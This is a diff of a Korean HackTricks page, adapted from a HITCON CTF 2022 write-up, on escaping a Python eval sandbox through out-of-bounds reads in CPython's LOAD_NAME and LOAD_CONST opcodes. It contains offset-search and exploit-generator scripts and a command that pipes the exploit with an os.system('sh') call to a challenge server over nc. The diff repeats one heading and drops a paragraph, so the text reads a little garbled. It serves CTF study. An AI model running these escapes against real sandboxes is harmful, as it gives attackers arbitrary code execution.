@@ -1,26 +1,27 @@
-# LOAD\_NAME / LOAD\_CONST opcode OOB Read
+# LOAD_NAME / LOAD_CONST opcode OOB Read
+
+{% hint style="success" %}
+AWS 해킹을 배우고 실습하세요:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹을 배우고 실습하세요: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
+<summary>HackTricks 지원하기</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
-* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 PR을 제출**하세요.
+* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.
 
 </details>
+{% endhint %}
 
 **이 정보는** [**이 글에서 가져왔습니다**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-LOAD\_NAME / LOAD\_CONST opcode의 OOB read 기능을 사용하여 메모리에서 일부 심볼을 가져올 수 있습니다. 이는 `(a, b, c, ... 수백 개의 심볼 ..., __getattribute__) if [] else [].__getattribute__(...)`와 같은 트릭을 사용하여 원하는 심볼(예: 함수 이름)을 가져올 수 있음을 의미합니다.
+LOAD_NAME / LOAD_CONST 옵코드의 OOB read 기능을 사용하여 메모리에서 일부 심볼을 얻을 수 있습니다. 이는 원하는 심볼(예: 함수 이름)을 얻기 위해 `(a, b, c, ... 수백 개의 심볼 ..., __getattribute__) if [] else [].__getattribute__(...)`와 같은 트릭을 사용하는 것을 의미합니다.
 
-그런 다음 exploit을 작성하면 됩니다.
+그런 다음 exploit을 작성하세요.
 
 ### 개요 <a href="#overview-1" id="overview-1"></a>
 
@@ -31,13 +32,9 @@ if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-임의의 Python 코드를 입력할 수 있으며, 이는 [Python 코드 객체](https://docs.python.org/3/c-api/code.html)로 컴파일됩니다. 그러나 해당 코드 객체의 `co_consts`와 `co_names`는 eval하기 전에 빈 튜플로 대체됩니다.
+### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-따라서 이 방식으로 상수(예: 숫자, 문자열 등) 또는 이름(예: 변수, 함수)을 포함하는 모든 표현식은 최종적으로 segmentation fault를 발생시킬 수 있습니다.
-
-### 경계를 벗어난 읽기 <a href="#out-of-bound-read" id="out-of-bound-read"></a>
-
-segfault는 어떻게 발생하나요?
+세그멘테이션 오류가 발생하는 방법은 무엇인가요?
 
 간단한 예제로 시작해보겠습니다. `[a, b, c]`는 다음과 같은 바이트 코드로 컴파일될 수 있습니다.
 ```
@@ -47,11 +44,11 @@ segfault는 어떻게 발생하나요?
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-하지만 `co_names`이 빈 튜플이 되는 경우는 어떻게 될까요? `LOAD_NAME 2` 옵코드는 여전히 실행되고, 원래 그 메모리 주소에서 값을 읽으려고 시도합니다. 네, 이것은 out-of-bound read "기능"입니다.
+하지만 `co_names`이 빈 튜플이 되면 어떻게 될까요? `LOAD_NAME 2` 옵코드는 여전히 실행되고, 원래 있어야 했던 메모리 주소에서 값을 읽으려고 시도합니다. 네, 이것은 경계를 벗어난 읽기 "기능"입니다.
 
-해결책에 대한 핵심 개념은 간단합니다. CPython에서 `LOAD_NAME` 및 `LOAD_CONST`와 같은 일부 옵코드는 OOB read에 취약합니다.
+해결책의 핵심 개념은 간단합니다. CPython의 일부 옵코드인 `LOAD_NAME` 및 `LOAD_CONST`는 OOB(Out-Of-Bound) 읽기에 취약할 수 있습니다.
 
-이들은 `consts` 또는 `names` 튜플에서 인덱스 `oparg`의 객체를 검색합니다 (`co_consts` 및 `co_names`가 내부적으로 지칭하는 것입니다). CPython이 `LOAD_CONST` 옵코드를 처리할 때 무엇을 수행하는지 알아보기 위해 다음 짧은 코드 조각을 참조할 수 있습니다.
+이들은 `co_consts` 및 `co_names`로 내부적으로 명명된 `consts` 또는 `names` 튜플에서 인덱스 `oparg`에서 객체를 검색합니다. CPython이 `LOAD_CONST` 옵코드를 처리할 때 무엇을 하는지 알아보기 위해 `LOAD_CONST`에 대한 다음 짧은 코드 조각을 참조할 수 있습니다.
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -61,21 +58,23 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-이 방법을 사용하여 OOB 기능을 사용하여 임의의 메모리 오프셋에서 "name"을 가져올 수 있습니다. 어떤 이름을 가지고 있는지와 오프셋이 무엇인지 확인하려면 `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ...을 계속 시도하면 됩니다. 그리고 약 oparg > 700 정도에서 무언가를 찾을 수 있을 것입니다. 물론 gdb를 사용하여 메모리 레이아웃을 살펴볼 수도 있지만, 더 쉬울 것 같지는 않습니다.
+### Exploit 생성 <a href="#generating-the-exploit" id="generating-the-exploit"></a>
+
+이렇게 하면 OOB 기능을 사용하여 임의의 메모리 오프셋에서 "name"을 가져올 수 있습니다. 어떤 이름을 가지고 있는지와 오프셋이 무엇인지 확인하려면 `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... 계속 시도하면 됩니다. 그리고 약 oparg > 700에서 무언가를 찾을 수 있습니다. 물론 gdb를 사용하여 메모리 레이아웃을 살펴볼 수도 있지만, 더 쉬울 것 같지는 않습니다.
 
 ### Exploit 생성 <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-이름 / 상수에 대한 유용한 오프셋을 검색한 후에는 해당 오프셋에서 이름 / 상수를 가져와 사용하는 방법은 어떻게 해야 할까요? 여기에 팁이 있습니다:\
-`co_names=()`와 함께 `LOAD_NAME 5`에서 `__getattribute__` 이름을 가져올 수 있다고 가정해 봅시다. 그럼 다음과 같은 작업을 수행하면 됩니다:
+유용한 오프셋들을 이름/상수로 검색한 후, 해당 오프셋에서 이름/상수를 가져와 사용하는 방법은 무엇일까요? 여기에 한 가지 요령이 있습니다:\
+예를 들어 `co_names=()`로 `LOAD_NAME 5`에서 오프셋 5에서 `__getattribute__` 이름을 가져올 수 있다고 가정해봅시다. 그럼 다음과 같은 작업을 수행하면 됩니다:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> 주목할 점은 `__getattribute__`로 이름을 지정할 필요가 없다는 것입니다. 더 짧거나 더 이상한 이름으로 지정할 수도 있습니다.
+> `__getattribute__`로 이름을 지을 필요는 없습니다. 더 짧거나 더 이상한 이름으로 지을 수도 있습니다.
 
-바이트 코드를 확인하면 그 이유를 이해할 수 있습니다:
+바이트코드를 보기만 해도 그 이유를 이해할 수 있습니다:
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -92,16 +91,16 @@ FAST_DISPATCH();
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-`LOAD_ATTR`는 `co_names`에서도 이름을 가져옵니다. Python은 이름이 동일한 경우 동일한 오프셋에서 이름을 로드합니다. 따라서 두 번째 `__getattribute__`는 여전히 offset=5에서 로드됩니다. 이 기능을 사용하여 이름이 메모리 근처에 있으면 임의의 이름을 사용할 수 있습니다.
+`LOAD_ATTR`도 `co_names`에서 이름을 검색합니다. Python은 이름이 동일한 경우 동일한 오프셋에서 이름을 로드하므로 두 번째 `__getattribute__`는 여전히 오프셋=5에서 로드됩니다. 이 기능을 사용하면 이름이 메모리 근처에 있으면 임의의 이름을 사용할 수 있습니다.
 
-숫자를 생성하는 것은 간단해야합니다:
+숫자를 생성하는 것은 간단해야 합니다:
 
 * 0: not \[\[]]
 * 1: not \[]
 * 2: (not \[]) + (not \[])
 * ...
 
-### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
+### 악용 스크립트 <a href="#exploit-script-1" id="exploit-script-1"></a>
 
 길이 제한 때문에 상수를 사용하지 않았습니다.
 
@@ -140,7 +139,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-그리고 다음은 실제 Python 악용을 생성하기 위한 것입니다.
+그리고 다음은 실제 Python exploit을 생성하는 데 사용됩니다.
 ```python
 import sys
 import unicodedata
@@ -217,7 +216,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-기본적으로 다음과 같은 작업을 수행합니다. `__dir__` 메서드에서 얻은 문자열에 대해 다음 작업을 수행합니다:
+그것은 기본적으로 다음 작업을 수행합니다. 우리가 `__dir__` 메소드에서 얻는 문자열에 대해:
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -230,16 +229,17 @@ getattr(
 '__repr__').__getattribute__('__globals__')['builtins']
 builtins['eval'](builtins['input']())
 ```
+{% hint style="success" %}
+AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
+<summary>HackTricks 지원</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
-* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
+* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
+* 해킹 팁을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
 
 </details>
+{% endhint %}
